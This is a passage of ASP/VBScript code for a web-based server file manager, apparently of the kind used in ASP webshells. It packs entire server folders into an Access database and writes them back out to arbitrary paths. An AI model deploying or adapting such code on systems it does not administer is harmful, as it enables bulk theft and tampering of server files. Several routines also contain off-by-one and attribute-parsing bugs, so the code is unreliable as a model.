	HexStr="47 49 46 38 39 61 01 00 19 00 C4 00 00 6D 92 DA 66 8C D9 7E 9E DF 7B 9C DE 81 A0 DF 79 9A DD 62 89 D8 97 B1 E5 71 94 DB 84 A3 E0 58 81 D5 91 AC E3 5A 84 D6 69 8E DA 65 8B D8 8A A7 E2 76 98 DD 5E 86 D7 61 88 D7 74 97 DC 5D 86 D6 5C 85 D6 6E 92 DB 55 80 D5 6A 8F DA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 21 F9 04 00 00 00 00 00 2C 00 00 00 00 01 00 19 00 40 05 15 60 85 09 87 31 3D 51 60 15 C9 72 29 0C 25 39 0D 80 40 03 11 02 00 3B"
	Response.ContentType="IMAGE/GIF"
	WriteBytes HexStr
End Sub

'输出Css
Sub Page_Css()
%>
body
{
font-family: Verdana, Arial, "宋体";
font-size: 12px;
line-height: 1.5em;
color: #000000;
}
input,select,textarea
{
font-family: Verdana, Arial, "宋体";
font-size: 12px;
color: #000000;
}
a:link
{
font-size: 12px;
color: #000000;
text-decoration: none;
}
a:visited
{
font-size: 12px;
color: #000000;
text-decoration: none;
}
a:active
{
font-size: 12px;
line-height: normal;
color: #333333;
text-decoration: none;
}
a:hover
{
font-size: 12px;
color: #FF7F24;
text-decoration: underline;
}
hr { height:1px; color:#6595D6; }

table
{
BORDER-COLLAPSE: collapse;
}
table.border
{
border: 1px solid #6595D6;
}
td
{
font-family: Verdana, Arial, "宋体";
font-size: 12px;
line-height: 1.5em;
color: #000000;
}
td.border
{
border: 1px solid #6595D6;
}
td.inner
{
font-family: Verdana, Arial, "宋体";
font-size: 12px;
line-height: 1.5em;
color: #000000;
border: 0px;
}
th
{
font-family: Verdana, Arial, "宋体";
font-size: 12px;
line-height: 1.5em;
color: #FFFFFF;
height:25px;
background-color:#427FBB;
background-image:url(?page=img);
}
th.border
{
border: 1px solid #6595D6;
}
.b { width:55px; height:22px; font-size:12px; }
<%
End Sub

'================ Functions ==================
Function IsFolder(ByVal fname)
	IsFolder=oFso.FolderExists(fname)
End Function

Function IsFile(ByVal fname)
	IsFile=oFso.FileExists(fname)
End Function

'字节数统计 Bytes
Function SizeCount(ByVal iSize)
	On Error Resume Next
	Dim size,showsize
	size=iSize
	showsize=size & "&nbsp;Byte" 
	if size>1024 then
	   size=(Size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;KB"
	end if
	if size>1024 then
	   size=(size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;MB"		
	end if
	if size>1024 then
	   size=(size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;GB"	   
	end if   
	SizeCount = showsize
End Function

'16进制字符转10进制数字
Function Hex2Num(v)
	Dim w
	If IsNumeric(v) Then
		w=Int(v)
	Else
		Select Case UCase(v)
			Case "A": w=10
			Case "B": w=11
			Case "C": w=12
			Case "D": w=13
			Case "E": w=14
			Case "F": w=15
			Case Else: w=0
		End Select
	End If
	Hex2Num=w
End Function
'取得字节字符串的数值
Function Byte2Num(sByte)
	Dim b1,b2
	b1=Left(sByte,1)
	b2=Right(sByte,1)
	Byte2Num=Hex2Num(b1)*16+Hex2Num(b2)
End Function
'将16进制字节字符串输出为二进制数据
Function WriteBytes(sBytes)
	Dim sByte,i
	sByte=Split(sBytes," ")
	For i=0 To UBound(sByte)-1
		Response.BinaryWrite ChrB(Byte2Num(sByte(i)))
	Next
End Function

'获得文件图标
Function getFileIcon(extName)
	Select Case LCase(extName)
		Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
			getFileIcon = "Wingdings>2"
		Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
			getFileIcon = "Webdings>·"
		Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
			getFileIcon = "'webdings'>&#159;"
		Case "exe", "com", "bat", "cmd", "scr", "msi"
			getFileIcon = "Webdings>1"
		Case "sys", "dll", "ocx"
			getFileIcon = "Wingdings>&#255;"
		Case Else
			getFileIcon = "'Wingdings 2'>/"
	End Select
End Function

'获得磁盘类型
Function getDriveType(num)
	Select Case num
		Case 0
			getDriveType = "未知"
		Case 1
			getDriveType = "可移动磁盘"
		Case 2
			getDriveType = "本地硬盘"
		Case 3
			getDriveType = "网络磁盘"
		Case 4
			getDriveType = "CD-ROM"
		Case 5
			getDriveType = "RAM 磁盘"
	End Select
End Function

'判断是否为脚本文件
Function IsScriptFile(Ext)
	Const ScriptExts="asp,aspx,asa,php"
	IsScriptFile=False
	Dim FileExt,Exts
	FileExt=LCase(Ext)
	Exts=Split(ScriptExts,",")
	Dim i
	For i=0 To UBound(Exts)-1
		If Exts(i)=FileExt Then
			IsScriptFile=True
			Exit Function
		End If
	Next
	IsScriptFile=False
End Function

'返回消息并关闭
Sub EchoClose(msg)
	Response.Write "<script language=""Javascript"">alert("""&msg&""");window.close();</script>"
End Sub
'返回消息并关闭
Sub EchoBack(msg)
	Response.Write "<script language=""Javascript"">alert("""&msg&""");history.back();</script>"
End Sub

'文件属性类
Class FileAttrib_Cls
Public n,r,h,s,d,a,al,c
Private Sub Class_Initialize()
	n=0:r=0:h=0:s=0:d=0:a=0:al=0:c=0
End Sub
Public Property Let Attrib(v)
	If v=0 Then
		n=1
		Exit Property
	End If
	If v>=2048 Then
		c=1
		v=v Mod 2048
	End If
	If v>=1024 Then
		al=1
		v=v Mod 64
	End If
	If v>=32 Then
		a=1
		v=v Mod 32
	End If
	If v>=16 Then
		d=1
		v=v Mod 8
	End If
	If v>=4 Then
		s=1
		v=v Mod 4
	End If
	If v>=2 Then
		h=1
		v=v Mod 2
	End If
	If v>=1 Then
		r=1
	End If
End Property
End Class

'============================ 文件打包及解包过程 =============================
'文件打包
Sub Pack(ByVal FPath, ByVal sDbPath)
	Server.ScriptTimeOut=900
	Dim DbPath
	If Right(sDbPath,4)=".mdb" Then
		DbPath=sDbPath
	Else
		DbPath=sDbPath&".mdb"
	End If

	If oFso.FolderExists(DbPath) Then
		EchoBack "不能创建数据库文件！"&Replace(DbPath,"\","\\")
		Exit Sub
	End If
	If oFso.FileExists(DbPath) Then
		oFso.DeleteFile DbPath
	End If

	If IsFolder(FPath) Then
		RootPath=GetParentFolder(FPath)
		If Right(RootPath,1)<>"\" Then RootPath=RootPath&"\"
	Else
		EchoBack "请输入文件夹路径！"
		Exit Sub
	End If

	Dim oCatalog,connStr,DataName
	Set conn=Server.CreateObject("ADODB.Connection")
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set oCatalog=Server.CreateObject("ADOX.Catalog")
	Set rs=Server.CreateObject("ADODB.RecordSet")
	On Error Resume Next
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & DbPath
	oCatalog.Create connStr
	If Err Then
		EchoBack "不能创建数据库文件！"&Replace(DbPath,"\","\\")
		Exit Sub
	End If
	Set oCatalog=Nothing
	conn.Open connStr
	conn.Execute("Create Table Files(ID int IDENTITY(0,1) PRIMARY KEY CLUSTERED, FilePath VarChar, FileData Image)")
	oStream.Open
	oStream.Type=1
	rs.Open "Files",conn,3,3
	DataName=Left(oFso.GetFile(DbPath).Name,InstrRev(oFso.GetFile(DbPath).Name,".")-1)
	NoPackFiles=Replace(NoPackFiles,"<$datafile>",DataName)

	FailFileList=""		'打包失败的文件列表
	PackFolder FPath
	If FailFilelist="" Then
		EchoClose "文件夹打包成功！"
	Else
		Response.Write "<link rel='stylesheet' type='text/css' href='?page=css'>"
		Response.Write "<Script Language='JavaScript'>alert('文件夹打包完成！\n以下是打包失败的文件列表：');</Script>"
		Response.Write "<body>"&Replace(FailFilelist,"|","<br>")&"</body>"
	End If
	oStream.Close
	rs.Close
	conn.Close
End Sub
'添加文件夹（递归）
Sub PackFolder(FolderPath)
	If Not IsFolder(FolderPath) Then Exit Sub
	Dim oFolder,sFile,sFolder
	Set oFolder=oFso.GetFolder(FolderPath)
	For Each sFile In oFolder.Files
		If InStr(NoPackFiles,"|"&sFile.Name&"|")<1 Then
			PackFile sFile.Path
		End If
	Next
	Set sFile=Nothing
	For Each sFolder In oFolder.SubFolders
		PackFolder sFolder.Path
	Next
	Set sFolder=Nothing
End Sub
'添加文件
Sub PackFile(FilePath)
	Dim RelPath
	RelPath=Replace(FilePath,RootPath,"")
	'Response.Write RelPath & "<br>"
	On Error Resume Next
	Err.Clear
	Err=False
	oStream.LoadFromFile FilePath
	rs.AddNew
	rs("FilePath")=RelPath
	rs("FileData")=oStream.Read()
	rs.Update
	If Err Then
		'一个文件打包失败
		FailFilelist=FailFilelist&FilePath&"|"
	End If
End Sub

'===========================================================================
'文件解包
Sub UnPack(vFolderPath,DbPath)
	Server.ScriptTimeOut=900
	Dim FilePath,FolderPath,sFolderPath
	FolderPath=vFolderPath
	FolderPath=Trim(FolderPath)
	If Mid(FolderPath,2,1)<>":" Then
		EchoBack "路径格式错误，无法创建改目录！"
		Exit Sub
	End If

	If Right(FolderPath,1)="\" Then FolderPath=Left(FolderPath,Len(FolderPath)-1)
	Dim connStr
	Set conn=Server.CreateObject("ADODB.Connection")
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set rs=Server.CreateObject("ADODB.RecordSet")
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & DbPath
	On Error Resume Next
	Err=False
	conn.Open connStr
	If Err Then
		EchoBack "数据库打开错误！"
		Exit Sub
	End If
	Err=False
	oStream.Open
	oStream.Type=1
	rs.Open "Files",conn,1,1
	FailFilelist=""		'清空失败文件列表
	Do Until rs.EOF
		Err.Clear
		Err=False
		FilePath=FolderPath&"\"&rs("FilePath")
		FilePath=Replace(FilePath,"\\","\")
		sFolderPath=Left(FilePath,InStrRev(FilePath,"\"))
		If Not oFso.FolderExists(sFolderPath) Then
			CreateFolder(sFolderPath)
		End If
		oStream.SetEos()
		oStream.Write rs("FileData")
		oStream.SaveToFile FilePath,2

		If Err Then		'添加失败文件项目
			FailFilelist=FailFilelist&rs("FilePath").Value&"|"
		End If

		rs.MoveNext
	Loop
	rs.Close
	Set rs=Nothing
	conn.Close
	Set conn=Nothing
	Set oStream=Nothing
	If FailFilelist="" Then
		EchoClose "文件解包成功！"
	Else
		Response.Write "<link rel='stylesheet' type='text/css' href='?page=css'>"
		Response.Write "<Script Language='JavaScript'>alert('文件夹打包完成！\n以下是打包失败的文件列表，请检查');</Script>"
		Response.Write "<body>"&Replace(FailFilelist,"|","<br>")&"</body>"
	End If
End Sub
'===========================================================================

'===========================================================================
'建立文件夹（递归）
Function CreateFolder(FolderPath)
	On Error Resume Next
	Err=False
	Dim sParFolder
	sParFolder=GetParentFolder(FolderPath)
	If Not oFso.FolderExists(sParFolder) Then
		CreateFolder(sParFolder)
	End If
	oFso.CreateFolder(FolderPath)
	If Err Then
		CreateFolder=False
	Else
		CreateFolder=True
	End If
End Function
Function GetParentFolder(Path)
	Dim sPath
	sPath=Path
	If Right(sPath,1)="\" Then sPath=Left(sPath,Len(sPath)-1)
	sPath=Left(sPath,InstrRev(sPath,"\")-1)
	GetParentFolder=sPath
End Function
'============================================================================
Sub wv(v)
If v>0 Then Response.Write " checked "
End Sub
%>